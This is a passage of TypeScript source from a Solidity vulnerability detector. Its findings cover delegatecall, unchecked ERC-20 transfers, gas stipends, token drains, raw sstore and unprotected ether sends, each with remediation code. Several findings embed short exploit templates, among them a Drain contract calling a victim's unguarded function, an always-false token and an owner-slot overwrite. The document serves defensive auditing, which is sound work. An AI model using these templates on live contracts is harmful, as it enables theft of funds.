        // Fix 36: the standard proxy upgrade surface. upgradeTo /
        // upgradeToAndCall / _setImplementation on a proxy-shaped
        // contract delegatecall the new implementation BY DESIGN —
        // that is the proxy pattern, not an anomaly. With access
        // control on the entry point, no arbitrary caller can redirect
        // execution; the poll found 44+ of these at critical/high with
        // 0 reproduced. An upgrade function with NO access-control
        // evidence falls through to the generic branch below and keeps
        // its critical — that shape is genuinely open.
        push(make({
          severity: "info",
          swc: "SWC-112",
          title: `${fn.name} is the standard proxy upgrade path (access-controlled)`,
          confidence: "high",
          detector: "delegatecall",
          summary: `${contract.name} is a proxy-shaped contract and ${fn.name} is its upgrade entry point: delegatecalling the new implementation is the mechanism, and the function is access-controlled, so no arbitrary caller can redirect execution to an arbitrary contract. The residual risk is governance trust in whoever holds the upgrade key — audit that key's custody, not this function's shape.`,
          walkthrough: delegateWalk(fn.name, call),
          exploitSolidity: "",
          remediationSolidity: `Keep the upgrade entry access-controlled (onlyOwner / onlyAdmin / a ProxyAdmin), and prefer a timelock on upgrades.`,
          locationFn: fn.name,
          locationLine: call.line,
          snippet: snippet(parsed, call.line + delta, delta),
        }));
      } else {
        const severity: Severity = call.targetIsParam ? "critical" : call.targetIsConst ? "medium" : "high";
      push(withAccessControlCap(make({
        severity,
        swc: "SWC-112",
        title: call.targetIsParam
          ? `${fn.name} delegatecalls a caller-supplied address`
          : `${fn.name} delegatecalls ${call.target || "another contract"}`,
        confidence: "high",
        detector: "delegatecall",
        summary: "Delegatecall runs the target's code against this contract's storage. A writable target can overwrite owner, balances, or any other slot.",
        walkthrough: delegateWalk(fn.name, call),
        exploitSolidity: delegateExploit(contract.name),
        remediationSolidity: `// EIP-1967 Storage Slot Isolation + Strict Implementation Whitelist
bytes32 private constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
mapping(address => bool) public allowedImplementations;

function upgradeToAndCall(address newImpl, bytes calldata data) external onlyOwner {
    require(allowedImplementations[newImpl], "Unauthorized implementation");
    assembly {
        sstore(_IMPLEMENTATION_SLOT, newImpl)
    }
    (bool ok, ) = newImpl.delegatecall(data);
    require(ok, "Delegatecall failed");
}`,
        locationFn: fn.name,
        locationLine: call.line,
        snippet: snippet(parsed, call.line + delta, delta),
      }), authed));
      }
    }
    // Fix 16: erc20-unchecked fires ONLY for EXTERNAL token calls.
    // The contract's own/inherited transfer/transferFrom (the token
    // being transferred is THIS contract's token) does not count —
    // Fibonum's sellAllTokens calls its own transfer, which always
    // returns true and whose _transfer reverts on failure.
    // Fix 25: downgrade to LOW when the function is access-controlled,
    // the recipient is fixed/stored (not caller-chosen), and a silent
    // failure is recoverable — no claimed/paid marker and no per-user
    // debit, so the tokens stay in the contract and the caller can
    // retry (saudibird withdrawAllERC20: onlyOwner, fixed 5/95 split
    // to stored addresses). A user claim payout (debit + transfer)
    // stays HIGH: a silent failure would strand the user's funds.
    // A non-authed transfer, or one to a caller-chosen recipient,
    // also stays HIGH.
    if (call.kind === "erc20" && !call.checked && !call.ownToken && !hasBalanceDeltaCheck(fn.source)) {
      const recipientFixed = call.recipient !== undefined && call.recipient !== "" && !isCallerControlled(call.recipient, fn, contract);
      const recoverable = !/claimed|paidOut|withdrawn/.test(fn.source) && !debitsOwnCredit(fn);
      const downgraded = authed && recipientFixed && recoverable;
      push(make({
        severity: downgraded ? "low" : "high",
        swc: "SWC-104",
        title: `${fn.name} ignores an ERC-20 bool`,
        confidence: "medium",
        detector: "erc20-unchecked",
        summary: downgraded
          ? "transfer or transferFrom is used as a statement. Tokens that return false instead of reverting (including some USDT-like tokens, and any token that can fail a fee) look successful. Downgraded: the function is access-controlled, the recipient is a fixed/stored address, and a silent failure leaves the tokens in the contract for a retry — no attacker can exploit the discarded bool and no third-party victim loses funds."
          : "transfer or transferFrom is used as a statement. Tokens that return false instead of reverting (including some USDT-like tokens, and any token that can fail a fee) look successful.",
        walkthrough: "1. The ERC-20 spec allows returning false.\n2. A statement-level call discards the bool.\n3. The contract then mints credit, releases collateral, or burns a position the token never moved.",
        exploitSolidity: `contract FalseToken {
    function transfer(address, uint256) external pure returns (bool) { return false; }
}`,
        remediationSolidity: `import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
using SafeERC20 for IERC20;
token.safeTransfer(to, amount);`,
        locationFn: fn.name,
        locationLine: call.line,
        snippet: snippet(parsed, call.line + delta, delta),
      }));
    }
    // Fix 31: the 2300-gas stipend finding fires at low ONLY when
    // the send's return is UNCHECKED. When the return is checked
    // (require(payable(x).send(y)), if(!send(...)) revert, assignment
    // + check), a failed send reverts instead of silently losing
    // funds — downgrade to INFO (a liveness note only). transfer()
    // always reverts on failure, so it is always the checked shape.
    if ((call.kind === "transfer" || call.kind === "send") && call.sendsValue) {
      const checkedSend = call.kind === "transfer" || call.checked;
      push(make({
        severity: checkedSend ? "info" : "low",
        swc: "SWC-134",
        title: `${fn.name} forwards ether with a 2300-gas stipend`,
        confidence: "high",
        detector: "eth-gas-stipend",
        summary: checkedSend
          ? "address.transfer and address.send forward 2300 gas. A receiving contract whose fallback uses more than that — a cold SLOAD is enough after Berlin — cannot be paid. The return is checked (or transfer() is used, which reverts on failure), so a failed send reverts instead of silently losing funds; the residual risk is liveness only."
          : "address.transfer and address.send forward 2300 gas. A receiving contract whose fallback uses more than that — a cold SLOAD is enough after Berlin — cannot be paid, and send's false return is easy to ignore.",
        walkthrough: checkedSend
          ? "1. The stipend was meant as a reentrancy mitigation. It is not enough anymore, and it breaks legitimate receivers.\n2. The return value is checked (or transfer() reverts on failure), so a failed send reverts instead of silently losing funds.\n3. The residual risk is liveness: a recipient that cannot accept the transfer makes this function revert."
          : "1. The stipend was meant as a reentrancy mitigation. It is not enough anymore, and it breaks legitimate receivers.\n2. Use call{value} and a reentrancy guard, and check the bool.",
        exploitSolidity: "",
        remediationSolidity: `(bool ok, ) = to.call{value: amount}("");
require(ok, "pay");`,
        locationFn: fn.name,
        locationLine: call.line,
        snippet: snippet(parsed, call.line + delta, delta),
      }));
    }
  };

  const noteExpr = (expr: unknown, asStatement: boolean) => {
    if (!expr || typeof expr !== "object") return;
    const node = expr as AstNode;
    // Fix 12: record reads of state vars. Only bare Identifiers that
    // reach noteExpr are recorded — assignment LHS writes go to
    // noteWrite, and FunctionCall callees are not recursed into, so
    // a write is never misread as a read here. A read inside a
    // `V += 1` LHS is not recorded (it is part of the write itself,
    // not a stale-read consumer).
    if (node.type === "Identifier" && typeof node.name === "string" && stateNames.has(node.name)) {
      const reads = flow.readLines.get(node.name) ?? [];
      reads.push(lineOf(node, delta, fn.line));
      flow.readLines.set(node.name, reads);
    }
    if (node.type === "BinaryOperation" && typeof node.operator === "string" && ASSIGN.has(node.operator)) {
      noteExpr(node.right, false);
      noteWrite(node.left as AstNode);
      return;
    }
    if (node.type === "UnaryOperation" && (node.operator === "++" || node.operator === "--" || node.operator === "delete")) {
      noteWrite(node.subExpression as AstNode);
      return;
    }
    if (node.type === "FunctionCall") {
      const args = (node.arguments as unknown[]) ?? [];
      args.forEach((a) => noteExpr(a, false));
      const callee = unwrapCallee(node.expression as AstNode);
      const member = callee.member;
      // Fix 12 (b): record EVERY bare internal call, not only the
      // LOW_LEVEL ones. The `internal` branch below sits inside a gate
      // that requires LOW_LEVEL / selfdestruct / a base, so an
      // ordinary bare call like readX() never reaches it — the
      // callee-read consumer check would never see it.
      if (!callee.base && member && byName.has(member)) {
        flow.calleeCalls.push({ name: member, line: lineOf(node, delta, fn.line) });
      }
      // Fix 27 (hook window): a BARE call to a known receiver-hook
      // carrier genuinely opens a reentrancy window — the callee
      // invokes onERC721Received / onERC1155Received on the
      // recipient — even when the callee is inherited (not in byName)
      // or when profile() does not mark it external (profile() only
      // counts LOW_LEVEL calls, and the hook call is a plain member
      // call). This must live OUTSIDE the gate below: bare calls fail
      // that gate (no callee.base), so the internal branch inside it
      // never runs for them. Without this synthetic ExtCall, the
      // inherited _safeMint hook would never produce a window, and
      // the MettiApe mint reentrancy mediums would die with the view
      // call they currently (wrongly) rest on. kind "member" keeps
      // the severity at medium; sendsValue false (no ether moves).
      // Member calls (token.safeTransferFrom(...)) already produce an
      // ExtCall via noteCall below, so only bare calls need this.
      if (!callee.base && member && HOOK_CARRIERS.has(member)) {
        noteCall({
          kind: "member",
          line: lineOf(node, delta, fn.line),
          checked: true,
          sendsValue: false,
          target: member,
          targetIsParam: false,
          targetIsConst: false,
          argCount: args.length,
          raw: sliceOf(parsed, node),
          synthetic: true,
        });
      }
      if (member && (LOW_LEVEL.has(member) || member === "selfdestruct" || member === "suicide" || (!BUILTIN.has(member) && callee.base))) {
        const baseName = rootIdent(callee.base ?? undefined);
        const target = sliceOf(parsed, callee.base ?? undefined);
        const sendsValue = namedValue(callee.named, "value") || member === "transfer" || member === "send";
        let kind: ExtKind = "member";
        if (member === "call") kind = "call";
        else if (member === "delegatecall") kind = "delegatecall";
        else if (member === "staticcall") kind = "staticcall";
        else if (member === "callcode") kind = "callcode";
        else if (member === "send") kind = "send";
        else if (member === "transfer" && args.length <= 1) kind = "transfer";
        else if (member === "transfer" || member === "transferFrom") kind = "erc20";
        else if (member === "selfdestruct" || member === "suicide") kind = "selfdestruct";
        else if (rootIdent(callee.base ?? undefined) === "this" || (baseName && !stateNames.has(baseName) && baseName !== "abi" && baseName !== "msg" && baseName !== "block")) {
          kind = "member";
        } else if (baseName && stateNames.has(baseName)) kind = "member";
        else kind = "member";

        const isLow = kind === "call" || kind === "delegatecall" || kind === "staticcall" || kind === "callcode" || kind === "send" || kind === "transfer" || kind === "selfdestruct" || kind === "erc20";
        const internal = !callee.base && member && byName.has(member);
        // Fix 15: super.* calls are NOT external calls. A super call
        // is an internal JUMP to the base implementation — no CALL
        // opcode, no control transfer to another contract. TRYfinance
        // read-only ×2 + the _transfer reentrancy medium (whose
        // "external call" was super._transfer) and AsyncArtwork's
        // expectedTokenSupply read-only (super._safeMint) all die
        // here. Documented limitation: a super call to a hook-carrying
        // function (standard OZ ERC721 _transferFrom with its receiver
        // hook) + a demonstrated consumer is missed — exotic, accepted
        // for this batch; no transitive callee-body analysis.
        const isSuperCall = callee.base?.type === "Identifier" && (callee.base as AstNode).name === "super";
        // Library calls are compile-time inlined — no CALL opcode, no
        // control transfer — but ONLY when the library fn itself cannot
        // call out. A pure/view library fn (MerkleProof.verify) can only
        // compute, so it is not an external call. A non-view library fn
        // (SafeERC20.safeTransfer) may contain a real .call, so it stays
        // an external call. An imported library is invisible here, so
        // this covers in-file / flattened libraries.
        const libraryFn =
          baseName && member
            ? model.contracts
                .find((c) => c.kind === "library" && c.name === baseName)
                ?.functions.find((f) => f.name === member)
            : undefined;
        const isPureLibraryCall =
          libraryFn !== undefined &&
          (libraryFn.mutability === "pure" || libraryFn.mutability === "view");
        // Fix 29: self/base-qualified calls are internal JUMPs. A
        // member call whose base is a BARE identifier naming a contract
        // type in the inheritance hierarchy (this contract or one of
        // its bases — ERC721.ownerOf(...) in a contract inheriting
        // ERC721) is a qualified internal call, not an external CALL.
        // The base must NOT be a state variable or parameter: a call
        // on a contract-typed variable (token.transfer(...)) is a
        // call on another instance, so it stays external.
        const isSelfQualifiedCall =
          callee.base?.type === "Identifier" &&
          baseName !== null &&
          !contract.stateVars.some((v) => v.name === baseName) &&
          !fn.params.some((p) => p.name === baseName) &&
          (baseName === contract.name || contract.bases.includes(baseName)) &&
          model.contracts
            .find((c) => c.name === baseName)
            ?.functions.some((f) => f.name === member) === true;
        // Fix 27: the window-opening call must be capable of reaching
        // attacker code. A view/pure call to a NON-attacker-controlled
        // callee has no hook path: the callee cannot execute attacker
        // code, so it opens no window. The callee is resolved via the
        // base's declared type (state var or parameter) or the type
        // name itself; unresolvable callees fail closed (still count).
        const resolved = member && baseName ? resolveCalleeFn(member, baseName, fn, contract, model) : undefined;
        const isNonWindowViewCall =
          resolved !== undefined &&
          (resolved.fn.mutability === "view" || resolved.fn.mutability === "pure") &&
          !isCallerControlled(baseName ?? "", fn, contract);
        if (!internal && !isSuperCall && !isPureLibraryCall && !isSelfQualifiedCall && !isNonWindowViewCall && (isLow || kind === "member") && member && !BUILTIN.has(member) && !SAFE_MATH.has(member)) {
          // Skip obvious value-type methods and type conversions.
          // A call that CONSTRUCTS a value is not an external call and
          // transfers no control: a struct constructor
          // (F3Ddatasets.TeamFee(32, 0) — base is a BARE identifier
          // naming a known contract or library, member is a Capitalized
          // struct name, and the member is not a real function of that
          // type). The bare-identifier base is what separates it from a
          // real call on a converted type: IRouter(router).WETH() has
          // member WETH and rootIdent IRouter, but its base is a
          // FunctionCall, not a bare identifier, so it still counts.
          // FomoXP's constructor only assigns
          // fees_[i] = F3Ddatasets.TeamFee(...) — no CALL opcode — but
          // was flagged for read-only reentrancy because the struct
          // constructor counted as a call before the writes. Imported
          // types are invisible to the model, so they still count as
          // calls: fail closed.
          const typeNames = new Set(model.contracts.map((c) => c.name));
          const isConstruction =
            callee.base?.type === "Identifier" &&
            /^[A-Z]/.test(member) &&
            baseName !== null &&
            typeNames.has(baseName) &&
            libraryFn === undefined;
          // Fix 16: own/inherited token transfer — a bare
          // transfer/transferFrom resolving to this contract's own
          // or an inherited function, or this.transfer(...). The
          // token being transferred is THIS contract's token, not
          // an external token's. The whole block (noteCall +
          // token-drain) is skipped: an own transfer is an internal
          // call, not an external one — it must not set flow.seen
          // (a write after the own transfer is not reentrancy) and
          // it is not a drain of an external token.
          const isThisTokenCall = callee.base?.type === "Identifier" && (callee.base as AstNode).name === "this" && (member === "transfer" || member === "transferFrom");
          const ownToken = (member === "transfer" || member === "transferFrom") && (((!callee.base && (byName.has(member) || inherited.has(member))) || isThisTokenCall));
          if (member !== "push" && member !== "pop" && !isConstruction && !ownToken) {
            const checked = kind === "transfer" || kind === "selfdestruct" ? true : !asStatement;
            // Fix 25: the ERC-20 recipient for the downgrade check
            // (transfer/safeTransfer arg 0, transferFrom arg 1).
            const recipient = kind === "erc20"
              ? sliceOf(parsed, args[member === "transferFrom" ? 1 : 0] as AstNode)
              : "";
            // Fix 17: the ether-send amount for the ledger-bound
            // check (transfer/send arg 0, call{value:} arg).
            let amount = "";
            if (member === "transfer" || member === "send") amount = sliceOf(parsed, args[0] as AstNode);
            else if (member === "call" && callee.named) {
              const named = callee.named as AstNode;
              const names = (named.names as string[] | undefined) ?? [];
              const namedArgs = (named.arguments as AstNode[] | undefined) ?? [];
              const vi = names.indexOf("value");
              if (vi >= 0) amount = sliceOf(parsed, namedArgs[vi]);
            }
            noteCall({
              kind,
              line: lineOf(node, delta, fn.line),
              checked,
              sendsValue: sendsValue && kind !== "erc20",
              target,
              targetIsParam: Boolean(baseName && (params.has(baseName) || baseName === "msg")),
              targetIsConst: Boolean(baseName && consts.has(baseName)),
              argCount: args.length,
              raw: sliceOf(parsed, node),
              recipient,
              ownToken,
              amount,
            });
            // Token drain: an unauthenticated function moves an
            // arbitrary amount of the contract's tokens to a FIXED
            // address (FUUUU's rescueERC20: anyone calls
            // token.transfer(devWallet, amount)). Scoped to the
            // fixed-recipient shape on purpose: a param recipient
            // (token.transfer(to, amt)) is also the DEX-pair / claim
            // shape, where the payout is bounded by an invariant the
            // detector cannot see — flagging it would FP every pair
            // swap. transferFrom is excluded (it pulls the caller's
            // own allowance-gated tokens), the token's own
            // transfer/transferFrom is excluded, a recipient of
            // msg.sender is a withdrawal, and a per-user debit is a
            // withdrawal too. A literal amount (transfer(devWallet,
            // 100)) is a bounded payout, not a drain; an amount
            // derived from the caller's own balance
            // (balances[msg.sender]) is the caller's own funds.
            if (
              (member === "transfer" || member === "safeTransfer") &&
              args.length >= 2 &&
              !authed &&
              !fn.isConstructor &&
              fn.visibility !== "internal" &&
              fn.visibility !== "private" &&
              fn.name !== "transfer" &&
              fn.name !== "transferFrom" &&
              fn.name !== "safeTransfer" &&
              !debitsOwnCredit(fn)
            ) {
              const rawCall = sliceOf(parsed, node);
              const drainMatch = rawCall.match(/\.\s*(transfer|safeTransfer)\s*\(\s*([^,]+?)\s*,\s*([^)]+?)\s*\)/);
              const recipient = (drainMatch?.[2] ?? "").trim();
              const amount = (drainMatch?.[3] ?? "").trim();
              const recipientFixed = recipient !== "" && !isCallerControlled(recipient, fn, contract);
              const amountControlled =
                amount !== "" &&
                !/^\d+(\.\d+)?\s*(ether|gwei|wei)?$/.test(amount) &&
                !/msg\.sender/.test(amount) &&
                isCallerControlled(amount, fn, contract);
              if (recipientFixed && amountControlled) {
                push(make({
                  severity: "high",
                  swc: "SWC-105",
                  title: `${fn.name} sends tokens with no access check`,
                  confidence: "medium",
                  detector: "token-drain",
                  summary: `${fn.name} calls ${member} on an external token, moving a caller-controlled amount to a fixed address, with no access check and no per-user debit. Anyone can drain whatever of that token the contract holds to the fixed recipient.`,
                  walkthrough: `1. ${fn.name} is externally callable with no modifier or msg.sender check.\n2. It moves ${amount || "a caller-chosen amount"} of an external token to ${recipient || "a fixed address"}.\n3. There is no per-user credit debit, so this is not a withdrawal of the caller's own funds.\n4. Call it with any amount up to the contract's token balance.`,
                  exploitSolidity: `interface IDrain { function ${fn.name}(address token, uint256 amount) external; }\ncontract Drain { function go(address victim, address token, uint256 amt) external { IDrain(victim).${fn.name}(token, amt); } }`,
                  remediationSolidity: `function ${fn.name}(address token, uint256 amount) external onlyOwner {\n    IERC20(token).transfer(${recipient || "to"}, amount);\n}`,
                  locationFn: fn.name,
                  locationLine: lineOf(node, delta, fn.line),
                  snippet: snippet(parsed, lineOf(node, delta, fn.line) + delta, delta),
                }));
              }
            }
          }
        }
        if ((member === "push" || member === "pop") && baseName && stateNames.has(baseName)) noteWrite(callee.base ?? undefined);
        if (internal && member) {
          const info = direct.get(member);
          // The callee's writes happen INSIDE the callee, around its own
          // external call — not after a call in THIS function. Record
          // them against the caller's own seen call (pre-call if none
          // yet), THEN note the callee's external effects. The old
          // order (synthetic call first) misattributed the callee's
          // internal ordering to the caller: DailyDivs transferAndCall
          // was flagged for transfer()'s writes, though transferAndCall
          // writes nothing after its own external call. The callee
          // itself is scanned separately and flagged on its own
          // ordering, so nothing is lost.
          if (info && info.writes.size > 0) {
            flow.sawWrite = true;
            if (flow.seen) flow.callThenWrite = true;
            for (const w of info.writes) (flow.seen ? flow.postCallWrites : flow.preCallWrites).add(w);
          }
          if (info?.external) {
            // A callee whose only external effects are 2300-gas
            // transfer/send has no reentrancy window: report the
            // synthetic call as a stipend call so the reentrancy
            // detector downgrades it to info instead of critical.
            const kinds = info.externalKinds ?? new Set<string>();
            const fullCall = [...kinds].some((k) => k === "call" || k === "delegatecall" || k === "staticcall" || k === "callcode");
            noteCall({
              kind: fullCall || kinds.size === 0 ? "call" : "transfer",
              line: lineOf(node, delta, fn.line),
              checked: true,
              sendsValue: true,
              target: member,
              targetIsParam: false,
              targetIsConst: false,
              argCount: args.length,
              raw: member + "()",
              synthetic: true,
            });
          }
        }
      }
      if (namedValue(callee.named, "gas")) {
        push(make({
          severity: "low",
          swc: "SWC-134",
          title: `${fn.name} sets a fixed gas stipend`,
          confidence: "medium",
          detector: "hardcoded-gas",
          summary: "A named `gas:` argument caps the callee. If the cap is too low the call fails; if the failure is ignored, state still updates.",
          walkthrough: "1. The `gas` option replaces the 63/64 rule with a hard cap.\n2. Opcode repricing (EIP-2929 and later) makes old constants wrong.",
          exploitSolidity: "",
          remediationSolidity: `// Omit gas: unless you have a measured, documented reason.\n(bool ok, ) = target.call{value: amount}(data);\nrequire(ok);`,
          locationFn: fn.name,
          locationLine: lineOf(node, delta, fn.line),
          snippet: snippet(parsed, (node.loc?.start.line ?? fn.line + delta), delta),
        }));
      }
      // Fix 30: the encodePacked check moved to scanSimple (text
      // based): the packed bytes must flow into a hash. See there.
      const amountOut = namedAmountZero(callee.named);
      if (amountOut) {
        push(make({
          severity: "high",
          swc: null,
          title: `${fn.name} sets a zero slippage bound`,
          confidence: "medium",
          detector: "slippage",
          summary: "A named amountOutMin (or amount0Min/amount1Min) argument is zero. The swap can be sandwiched to any price.",
          walkthrough: "1. The router will accept any output, including one wei.\n2. An attacker sandwiches the transaction: front-run to move the pool, let this call through, back-run to restore the price.\n3. Pass a caller-supplied minimum and deadline.",
          exploitSolidity: "",
          remediationSolidity: `router.swapExactTokensForTokens(amountIn, amountOutMin, path, to, deadline);`,
          locationFn: fn.name,
          locationLine: lineOf(node, delta, fn.line),
          snippet: snippet(parsed, (node.loc?.start.line ?? fn.line + delta), delta),
        }));
      }
      return;
    }
    if (node.type === "AssemblyCall" && node.functionName === "sstore") {
      const args = (node.arguments as AstNode[] | undefined) ?? [];
      const slot = rootIdent(args[0]);
      if (slot && params.has(slot)) {
        push(withAccessControlCap(make({
          severity: "critical",
          swc: "SWC-124",
          title: `${fn.name} SSTOREs to a caller-chosen slot`,
          confidence: "high",
          detector: "assembly-param-sstore",
          summary: "The first argument of sstore is a function parameter. The caller picks the storage slot and can overwrite owner or balances.",
          walkthrough: "1. sstore(slot, value) writes `value` to absolute slot `slot`.\n2. Slot 0 is often the owner. Slot 1 is often the first mapping's length or a packed address.\n3. There is no bounds check an ordinary assignment would have given you.",
          exploitSolidity: `// If the function is public: victim.write(0, uint256(uint160(attacker)));`,
          remediationSolidity: `// Do not take a raw slot from the caller.\nbalances[msg.sender] = amount;`,
          locationFn: fn.name,
          locationLine: lineOf(node, delta, fn.line),
          snippet: snippet(parsed, (node.loc?.start.line ?? fn.line + delta), delta),
        }), authed));
      } else {
        noteWrite(node);
        push(make({
          severity: "medium",
          swc: "SWC-124",
          title: `${fn.name} writes storage from assembly`,
          confidence: "medium",
          detector: "assembly-sstore",
          summary: "An inline sstore bypasses the type checker. Confirm the slot is a constant the layout actually owns.",
          walkthrough: "1. Assembly storage writes do not follow struct or mapping packing unless you replicate it.\n2. A wrong slot corrupts an adjacent variable with no revert.",
          exploitSolidity: "",
          remediationSolidity: "// Prefer a normal assignment unless this is a measured, reviewed hot path.",
          locationFn: fn.name,
          locationLine: lineOf(node, delta, fn.line),
          snippet: snippet(parsed, (node.loc?.start.line ?? fn.line + delta), delta),
        }));
      }
      return;
    }
    for (const [k, v] of Object.entries(node)) {
      if (k === "loc" || k === "range" || k === "type") continue;
      if (v && typeof v === "object") noteExpr(v, false);
    }
  };

  const scanStmts = (stmts: AstNode[], local: Flow) => {
    for (const stmt of stmts) scanStmt(stmt, local);
  };

  const scanStmt = (stmt: AstNode, local: Flow) => {
    // Run expression analysis against `local` by temporarily swapping — we use the outer `flow`
    // object the closures close over. Callers pass `flow` or we mutate a provided flow by
    // assigning into the closed-over one. To support branches we rebind via copy-back below.
    if (stmt.type === "Block" || stmt.type === "UncheckedStatement") {
      const block = (stmt.type === "UncheckedStatement" ? stmt.block : stmt) as AstNode;
      const inner = (block.statements as AstNode[] | undefined) ?? [];
      if (stmt.type === "UncheckedStatement") flagUnchecked(fn, stmt, model, parsed, delta, push);
      scanStmts(inner, local);
      return;
    }
    if (stmt.type === "IfStatement") {
      noteExpr(stmt.condition, false);
      const before = snapshot(flow);
      scanStmtOrBlock(stmt.trueBody as AstNode | undefined);
      const left = snapshot(flow);
      restore(flow, before);
      scanStmtOrBlock(stmt.falseBody as AstNode | undefined);
      const right = snapshot(flow);
      flow.seen = left.seen ?? right.seen ?? before.seen;
      flow.sawWrite = left.sawWrite || right.sawWrite || before.sawWrite;
      flow.sawCall = left.sawCall || right.sawCall || before.sawCall;
      flow.callThenWrite = left.callThenWrite || right.callThenWrite || before.callThenWrite;
      flow.writeThenCall = left.writeThenCall || right.writeThenCall || before.writeThenCall;
      flow.preCallWrites = new Set([...before.preCallWrites, ...left.preCallWrites, ...right.preCallWrites]);
      flow.postCallWrites = new Set([...before.postCallWrites, ...left.postCallWrites, ...right.postCallWrites]);
      flow.sawEtherSend = left.sawEtherSend || right.sawEtherSend || before.sawEtherSend;
      flow.sendTargets = [...before.sendTargets, ...left.sendTargets, ...right.sendTargets];
      flow.allSendsAreRefunds = left.allSendsAreRefunds && right.allSendsAreRefunds && before.allSendsAreRefunds;
      // Fix 12: merge the window bookkeeping across branches — first
      // write line per var is the minimum across branches, reads and
      // callee calls union.
      flow.writeLines = new Map([...before.writeLines, ...left.writeLines, ...right.writeLines].map(([k]) => {
        const vals = [before.writeLines.get(k), left.writeLines.get(k), right.writeLines.get(k)].filter((v): v is number => v !== undefined);
        return [k, Math.min(...vals)] as [string, number];
      }));
      flow.readLines = new Map([...before.readLines, ...left.readLines, ...right.readLines].map(([k]) => {
        const vals = [...(before.readLines.get(k) ?? []), ...(left.readLines.get(k) ?? []), ...(right.readLines.get(k) ?? [])];
        return [k, vals] as [string, number[]];
      }));
      flow.calleeCalls = [...before.calleeCalls, ...left.calleeCalls, ...right.calleeCalls];
      flow.sendDetails = [...before.sendDetails, ...left.sendDetails, ...right.sendDetails];
      return;
    }
    if (stmt.type === "ForStatement" || stmt.type === "WhileStatement" || stmt.type === "DoWhileStatement") {
      noteExpr(stmt.conditionExpression ?? stmt.condition, false);
      noteExpr(stmt.initExpression, false);
      noteExpr(stmt.loopExpression, false);
      if (/msg\.value/.test(sliceOf(parsed, stmt))) {
        push(make({
          severity: "high",
          swc: "SWC-132",
          title: `${fn.name} uses msg.value inside a loop`,
          confidence: "high",
          detector: "msg-value-loop",
          summary: "msg.value does not decrease per iteration. Each pass can credit the same ether again.",
          walkthrough: "1. The caller attaches ETH once.\n2. Every loop iteration reads the same msg.value and adds it to a balance or uses it as a payment.\n3. N iterations mint N times the deposit.",
          exploitSolidity: `// deposit(address[] users) payable { for (...) balances[users[i]] += msg.value; }`,
          remediationSolidity: `uint256 remaining = msg.value;\nfor (uint256 i; i < users.length; ++i) {\n    balances[users[i]] += share;\n    remaining -= share;\n}`,
          locationFn: fn.name,
          locationLine: lineOf(stmt, delta, fn.line),
          snippet: snippet(parsed, (stmt.loc?.start.line ?? fn.line + delta), delta),
        }));
      }
      scanStmtOrBlock(stmt.body as AstNode | undefined);
      return;
    }
    if (stmt.type === "ExpressionStatement") {
      const expr = stmt.expression as AstNode;
      if (expr?.type === "FunctionCall") noteExpr(expr, true);
      else noteExpr(expr, false);
      return;
    }
    if (stmt.type === "VariableDeclarationStatement") {
      noteExpr(stmt.initialValue, false);
      return;
    }
    if (stmt.type === "ReturnStatement") {
      noteExpr(stmt.expression, false);
      return;
    }
    if (stmt.type === "InlineAssemblyStatement") {
      noteExpr(stmt.body, false);
      return;
    }
    noteExpr(stmt, false);
  };

  const scanStmtOrBlock = (node: AstNode | undefined) => {
    if (!node) return;
    if (node.type === "Block") scanStmts((node.statements as AstNode[]) ?? [], flow);
    else scanStmt(node, flow);
  };

  // The `local` parameter is unused by design: branches restore `flow` explicitly.
  void scanStmts;
  if (fn.body?.type === "Block") scanStmts((fn.body.statements as AstNode[]) ?? [], flow);
  else if (fn.body) scanStmt(fn.body, flow);

  // Admin / ether paths that the walker doesn't phrase as a single finding.
  // Genuine ether sends come from the walker (transfer/send/call{value}),
  // not a source regex: the regex matched token transfer(to, x) and
  // super.transfer, neither of which moves ether.
  const sends = flow.sawEtherSend;
  // An ether send is only an open drain if the caller controls a
  // recipient: a param, msg.sender, or storage this function writes.
  // A send to a fixed recipient (owner, burn, a constant) cannot be
  // redirected to the attacker, so it is not a drain.
  const drainable = flow.sendTargets.some((t) => isCallerControlled(t, fn, contract));
  // Bounds and debits may live in an internal helper (processClaim),
  // not the entry function — check the transitive call path.
  // A pure refund (every send is to msg.sender of this call's own
  // msg.value) is not a drain: the caller only ever gets their own
  // deposit back. MyobuChef's addLiquidityNoFeeAndStake refunds
  // msg.value - ETHUsed to msg.sender and was flagged CRITICAL.
  const allSources = transitiveSources(fn, byName, direct);
  // Per-item auth suppresses the ether finding for formula-priced
  // payouts (ItemSelling buyback pays buybackPriceOf to the item
  // owner) but NOT for a full-balance send: an item owner draining
  // address(this).balance is still a drain. A require(balance >=
  // price) does not count — only a send whose VALUE is the balance.
  const perItemOnly = !fn.isConstructor && authed && !isAuthed(fn, contract, model, true);
  const sendsFullBalance = /\.(transfer|send)\s*\(\s*address\s*\(\s*this\s*\)\.balance\s*\)|call\s*\{\s*value\s*:\s*address\s*\(\s*this\s*\)\.balance/.test(fn.source);
  // Fix 17: a ledger-bound refund/payout (recipient AND amount from
  // the SAME stored mapping/struct entry) is not a drain.
  // Fix 18: a send to an address a require proves == msg.sender in
  // stored-field form is a self-refund, not a drain.
  // Fix 23: a same-mapping clearing self-payout (M[msg.sender] = 0
  // + send to msg.sender) is a debit, whatever M is named.
  if (sends && drainable && (!authed || (perItemOnly && sendsFullBalance)) && !flow.allSendsAreRefunds && !allSendsLedgerBound(flow.sendDetails) && !allSendsRequireProvenSelf(fn, flow.sendTargets) && !isSameMappingClearingSelfPayout(fn, flow.sendTargets) && !/ecrecover\s*\(/.test(fn.source) && !fn.isConstructor && fn.visibility !== "internal" && fn.visibility !== "private" && !debitsOwnCredit(fn, allSources) && !isMerkleBoundedPayout(fn, flow.sendTargets, allSources) && fn.mutability !== "view" && fn.mutability !== "pure") {
    push(make({
      severity: "critical",
      swc: "SWC-105",
      title: `${fn.name} sends ether with no access check`,
      confidence: "medium",
      detector: "unprotected-ether",
      summary: `${fn.name} moves ETH and neither authenticates msg.sender nor debits a per-user balance. If the recipient or the amount is not strictly the caller's own credit, this is an open drain.`,
      walkthrough: [
        `1. ${fn.name} is ${fn.visibility || "public"} and has no onlyOwner-style modifier and no msg.sender == owner check.`,
        "2. The body contains a value-bearing call, transfer, or send.",
        "3. There is no per-user credit debit (balances/balanceOf[msg.sender]), so this is not a normal withdrawal of the caller's own credit.",
        "4. Call it directly. If it transfers address(this).balance or pays an address argument, the contract is drainable.",
      ].join("\n"),
